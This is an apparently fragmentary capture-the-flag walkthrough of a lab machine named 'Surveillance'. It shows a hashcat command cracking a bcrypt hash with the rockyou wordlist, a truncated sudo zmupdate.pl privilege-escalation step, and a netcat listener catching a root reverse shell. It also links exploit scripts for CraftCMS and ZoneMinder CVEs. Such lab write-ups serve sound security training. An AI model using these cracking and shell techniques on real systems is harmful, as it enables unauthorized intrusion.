# Surveillance - Medium Machine

## User Flag
.....
Cracking it with `hashcat`:
```bash
../machines/medium➤ hashcat -m 3200 -a 0  hash.txt /usr/share/dict/rockyou.txt --force
hashcat (v6.2.6) starting
...
******************:*****************
```

And... we are in!

## Root Flag
```bash
sudo /usr/bin/zmupdate.pl --version=1 ......

And voila:
```bash
../machines/medium➤ nc -lvnp 4444
Connection from 10.10.11.245:58446
id
uid=0(root) gid=0(root) groups=0(root)
```

## TODOs
- Review https://github.com/Faelian/CraftCMS_CVE-2023-41892/blob/main/craft-cms.py
- Review CVE-2023-26035: https://raw.githubusercontent.com/rvizx/CVE-2023-26035/main/exploit.py
